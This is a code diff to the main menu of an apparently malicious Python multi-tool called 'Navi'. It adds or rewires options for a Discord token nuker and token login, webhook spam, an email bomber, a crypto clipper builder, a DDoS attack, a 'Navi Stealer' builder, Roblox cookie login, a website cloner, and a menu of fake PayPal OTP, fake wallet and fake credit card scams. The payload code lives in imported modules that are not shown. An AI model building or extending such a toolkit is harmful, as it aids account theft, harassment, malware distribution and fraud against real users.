@@ -1,13 +1,14 @@
 import sys, time, subprocess, json, os, threading
 
 def _init():
-    try: import pystyle, requests, selenium, dns.resolver, bs4
-    except: subprocess.check_call([sys.executable, "-m", "pip", "install", "pystyle", "requests", "selenium", "dnspython", "beautifulsoup4", "-q"])
+    try: import pystyle, requests, selenium, dns.resolver, bs4, socks
+    except: subprocess.check_call([sys.executable, "-m", "pip", "install", "pystyle", "requests", "selenium", "dnspython", "beautifulsoup4", "pysocks", "-q"])
+
 
 _init()
 
 from core.display import Colors, Colorate, System, boot_anim, print_banner, menu_opts, get_inpt, init_os, get_config, Theme, matrix_effect
-from modules.discord_tools import webhook_spam, webhook_delete, id_to_token, pfp_lookup, banner_lookup, server_info_lookup, nitro_generator, bot_invite_gen
+from modules.discord_tools import webhook_spam, webhook_delete, id_to_token, server_info_lookup, nitro_generator, bot_invite_gen
 from modules.network import do_port_check
 from modules.crypto import CryptXer, make_pw
 from modules.sysinfo import get_sys_data
@@ -86,17 +87,19 @@ def run_app():
         _cl = Theme.get_colors()
         print_banner()
         print(Colorate.Horizontal(_cl["head"], "    [ DISCORD ]              [ OSINT ]                [ MALICIOUS ]"))
-        _d = [("[1] Webhook Tools", "[10] Port Scanner", "[20] Email Bomber"),("[2] ID to Token", "[11] Whois Lookup", "[21] Clipper Build"),("[3] Token Info", "[12] DNS Lookup", "[22] Vuln Scanner"),("[4] PFP Lookup", "[14] Dox Tracker", "[23] DDoS Attack"),("[5] Nitro Gen", "[15] Dox Creator", ""), ("", "[16] Phone Lookup", ""), ("", "[17] Email Lookup", "")]
+        _d = [("[1] Webhook Tools", "[10] Port Scanner", "[20] Email Bomber"),("[2] Token Tools", "[11] Whois Lookup", "[21] Crypto Clipper"),("[3] Nitro Generator", "[12] DNS Lookup", "[22] Vuln Scanner"),("[4] Server Info", "[14] Dox Tracker", "[23] DDoS Attack"),("[5] Bot Invite Gen", "[15] Dox Creator", "[24] Navi Stealer"), ("", "[16] Phone Lookup", ""), ("", "[17] Email Lookup", "")]
+
+
         for _r1, _r2, _r3 in _d:
             def _f(s, w):
                 if not s: return " " * w
                 _p = s.find(']') + 2 if ']' in s else 0
                 return Colorate.Horizontal(_cl["num"], s[:_p]) + Colorate.Horizontal(_cl["txt"], f"{s[_p:]:<{w-_p}}")
             print(f"    {_f(_r1, 25)}{_f(_r2, 25)}{_f(_r3, 20)}")
-        print("\n" + Colorate.Horizontal(_cl["head"], "    [ GENERAL ]              [ ROBLOX ]               [ SYSTEM ]"))
-        _g = [("[30] Base64 Codec", "[40] User Info", "[60] Info"),("[31] System Info", "[41] Cookie Info", "[61] Config"),("[32] IP Pinger", "[42] Cookie Login", "[99] Exit"),("[33] Obfuscator", "", ""),("[13] Pass Generator", "", "")]
-        for _r1, _r2, _r3 in _g:
-            print(f"    {_f(_r1, 25)}{_f(_r2, 25)}{_f(_r3, 20)}")
+        print("\n" + Colorate.Horizontal(_cl["head"], "    [ GENERAL ]              [ ROBLOX ]               [ FAKER ]               [ SYSTEM ]"))
+        _g = [("[30] Base64 Codec", "[40] User Info", "[50] Faker Tools", "[60] Info"),("[31] System Info", "[41] Cookie Info", "[34] Web Cloner", "[61] Config"),("[32] IP Pinger", "[42] Cookie Login", "", "[99] Exit"),("[33] Obfuscator", "", "", ""),("[13] Pass Generator", "", "", "")]
+        for _r1, _r2, _r3, _r4 in _g:
+            print(f"    {_f(_r1, 25)}{_f(_r2, 25)}{_f(_r3, 24)}{_f(_r4, 20)}")
         _c = get_inpt()
         if _c == "1":
             while 1:
@@ -108,14 +111,38 @@ def run_app():
                 elif _cc == "2": webhook_delete(get_inpt("url:"))
                 elif _cc == "99": break
         elif _c == "2":
-            _uid = get_inpt("UID:")
-            print(Colorate.Horizontal(_cl["head"], f"  [+] Token: {id_to_token(_uid)}"))
-            input(Colorate.Horizontal(_cl["head"], "\n  Enter..."))
-        elif _c == "3":
-            from modules.discord_tools import token_info
-            token_info(get_inpt("Token:"))
-        elif _c == "4": pfp_lookup(get_inpt("UID:"))
-        elif _c == "5": nitro_generator(int(get_inpt("Threads (1):") or 1))
+            while 1:
+                print_banner()
+                print(Colorate.Horizontal(_cl["head"], "  [ TOKEN & ACCOUNT TOOLS ]\n"))
+                menu_opts({"1": "ID to Token", "2": "Token Info", "3": "Token Nuker", "4": "Token Login", "5": "Status Rotator", "6": "Token Onliner", "99": "Return"})
+                _cc = get_inpt("navi@discord/tokens:~#")
+                if _cc == "1":
+                    _uid = get_inpt("UID:")
+                    print(Colorate.Horizontal(_cl["head"], f"  [+] Token: {id_to_token(_uid)}"))
+                    input("\n  Enter...")
+                elif _cc == "2":
+                    from modules.discord_tools import token_info
+                    token_info(get_inpt("Token:"))
+                elif _cc == "3":
+                    from modules.discord_tools import token_nuker
+                    token_nuker(get_inpt("Token:"))
+                elif _cc == "4":
+                    from modules.discord_tools import token_login
+                    token_login(get_inpt("Token:"))
+                elif _cc == "5":
+                    from modules.discord_tools import token_rotator
+                    token_rotator(get_inpt("Token:"))
+                elif _cc == "6":
+                    from modules.discord_tools import token_onliner
+                    token_onliner()
+                elif _cc == "99": break
+        elif _c == "3": nitro_generator(int(get_inpt("Threads (1):") or 1))
+        elif _c == "4":
+            from modules.discord_tools import server_info_lookup
+            server_info_lookup(get_inpt("Invite Link:"))
+        elif _c == "5":
+            from modules.discord_tools import bot_invite_gen
+            bot_invite_gen(get_inpt("Bot ID:"))
         elif _c == "10":
             _res = do_port_check(get_inpt("host:"))
             if not _res: print(Colorate.Horizontal(_cl["num"], "  [!] None found."))
@@ -145,6 +172,8 @@ def run_app():
         elif _c == "17":
             from modules.osint import email_lookup_init
             email_lookup_init()
+
+
         elif _c == '20': mail_bomb(get_inpt("email:"), int(get_inpt("amt:") or 10)); input("\n  Enter...")
         elif _c == '21':
             from modules.malicious import build_clipper
@@ -155,6 +184,9 @@ def run_app():
         elif _c == '23':
             from modules.malicious import start_brute
             start_brute()
+        elif _c == '24':
+            from modules.recovery_builder import build_navi_recovery
+            build_navi_recovery()
         elif _c == '30':
             _m, _t = get_inpt("(E/D):").upper(), get_inpt("Text:")
             try: print(Colorate.Horizontal(_cl["head"], f"  Res: {CryptXer.b64_e(_t) if _m == 'E' else CryptXer.b64_d(_t)}"))
@@ -169,6 +201,9 @@ def run_app():
             ip_pinger()
         elif _c == '33':
             obfuscator_init()
+        elif _c == '34':
+            from modules.network import clone_website
+            clone_website(get_inpt("URL to clone:"))
         elif _c == '40':
             from modules.roblox import roblox_user_info
             roblox_user_info()
@@ -178,6 +213,32 @@ def run_app():
         elif _c == '42':
             from modules.roblox import roblox_cookie_login
             roblox_cookie_login()
+        elif _c == "50":
+            while 1:
+                print_banner()
+                print(Colorate.Horizontal(_cl["head"], "  [ FAKER & SIMULATIONS ]\n"))
+                menu_opts({
+                    "1": "Fake Token Gen", "2": "Fake Mail Gen", "3": "Fake Identity", 
+                    "4": "Fake Nitro", "5": "Fake DDoS", "6": "Fake Credit Cards", 
+                    "7": "Fake Wallet Miner", "8": "Social Botter", "9": "Fake PayPal OTP",
+                    "10": "Fake Account Gen", "11": "Fake Fortnite Check", "12": "Fake Exodus",
+                    "13": "Explanation", "99": "Return"
+                })
+                _cc = get_inpt("navi@faker:~#")
+                if _cc == "1": from modules.faker import fake_token_gen; fake_token_gen()
+                elif _cc == "2": from modules.faker import fake_mail_gen; fake_mail_gen()
+                elif _cc == "3": from modules.faker import fake_identity_gen; fake_identity_gen()
+                elif _cc == "4": from modules.faker import fake_nitro_gen; fake_nitro_gen()
+                elif _cc == "5": from modules.faker import fake_ddos; fake_ddos()
+                elif _cc == "6": from modules.faker import fake_cc_gen; fake_cc_gen()
+                elif _cc == "7": from modules.faker import fake_wallet_miner; fake_wallet_miner()
+                elif _cc == "8": from modules.faker import social_botter; social_botter()
+                elif _cc == "9": from modules.faker import fake_paypal_otp; fake_paypal_otp()
+                elif _cc == "10": from modules.faker import fake_account_gen; fake_account_gen()
+                elif _cc == "11": from modules.faker import fake_fortnite_checker; fake_fortnite_checker()
+                elif _cc == "12": from modules.faker import fake_exodus; fake_exodus()
+                elif _cc == "13": from modules.faker import faker_explanation; faker_explanation()
+                elif _cc == "99": break
         elif _c == "60": inf_view()
         elif _c == "61": cfg_mgr()
         elif _c == "99": sys.exit(0)
